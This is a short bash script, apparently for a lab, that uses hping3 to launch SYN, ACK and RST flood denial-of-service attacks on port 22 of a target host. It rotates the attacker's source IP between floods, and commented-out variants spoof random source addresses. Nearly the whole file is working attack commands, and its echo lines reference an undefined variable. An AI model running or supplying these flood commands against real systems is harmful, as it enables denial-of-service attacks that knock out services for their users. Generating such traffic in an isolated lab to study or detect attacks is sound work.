#!/bin/bash

# Configuration
TARGET_IP="10.10.10.10"
ATTACKER_INTERFACE="eth1"
GATEWAY="172.16.0.254"
BASE_IP="172.16.0"
PACKET_SIZE=120

echo "> DOS SYN Flood (src_ip: 172.16.0.160 / dst_ip: ${IP})"
ip addr del ${BASE_IP}.2/24 dev $ATTACKER_INTERFACE
ip addr add ${BASE_IP}.160/24 dev $ATTACKER_INTERFACE
ip route add 10.10.10.0/24 via $GATEWAY
timeout 1s hping3 ${TARGET_IP} --syn --flood -p 22 -d ${PACKET_SIZE}

echo "> DOS ACK Flood (src_ip: 172.16.0.161 / dst_ip: ${IP})"
ip addr del ${BASE_IP}.160/24 dev $ATTACKER_INTERFACE
ip addr add ${BASE_IP}.161/24 dev $ATTACKER_INTERFACE
ip route add 10.10.10.0/24 via $GATEWAY
timeout 1s hping3 ${TARGET_IP} --ack --flood -p 22 -d ${PACKET_SIZE}

echo "> DOS RST Flood (src_ip: 172.16.0.162 / dst_ip: ${IP})"
ip addr del ${BASE_IP}.161/24 dev $ATTACKER_INTERFACE
ip addr add ${BASE_IP}.162/24 dev $ATTACKER_INTERFACE
ip route add 10.10.10.0/24 via $GATEWAY
timeout 1s hping3 ${TARGET_IP} --rst --flood -p 22 -d ${PACKET_SIZE}

# echo "> DDOS SYN Flood (src_ip: XXX.XXX.XXX.XXX / dst_ip: ${IP})"
# ip addr del ${BASE_IP}.162/24 dev $ATTACKER_INTERFACE
# ip addr add ${BASE_IP}.163/24 dev $ATTACKER_INTERFACE
# ip route add 10.10.10.0/24 via $GATEWAY
# timeout 1s hping3 ${TARGET_IP} --syn --flood -p 22 -d ${PACKET_SIZE} --rand-source

# echo "> DDOS ACK Flood (src_ip: XXX.XXX.XXX.XXX / dst_ip: ${IP})"
# ip addr del ${BASE_IP}.163/24 dev $ATTACKER_INTERFACE
# ip addr add ${BASE_IP}.164/24 dev $ATTACKER_INTERFACE
# ip route add 10.10.10.0/24 via $GATEWAY
# timeout 1s hping3 ${TARGET_IP} --ack --flood -p 22 -d ${PACKET_SIZE} --rand-source

# echo "> DDOS RST Flood (src_ip: XXX.XXX.XXX.XXX / dst_ip: ${IP})"
# ip addr del ${BASE_IP}.164/24 dev $ATTACKER_INTERFACE
# ip addr add ${BASE_IP}.165/24 dev $ATTACKER_INTERFACE
# ip route add 10.10.10.0/24 via $GATEWAY
# timeout 1s hping3 ${TARGET_IP} --rst --flood -p 22 -d ${PACKET_SIZE} --rand-source

# echo "> UDP Flood (src_ip: 172.16.0.XXX / dst_ip: ${IP})"

# echo "> ICMP Flood (src_ip: 172.16.0.XXX / dst_ip: ${IP})"


echo "> Finishing scan and returning to original interface IP"
ip addr del 172.16.0.162/24 dev $ATTACKER_INTERFACE
ip addr add 172.16.0.2/24 dev $ATTACKER_INTERFACE
ip route add 10.10.10.0/24 via $GATEWAY
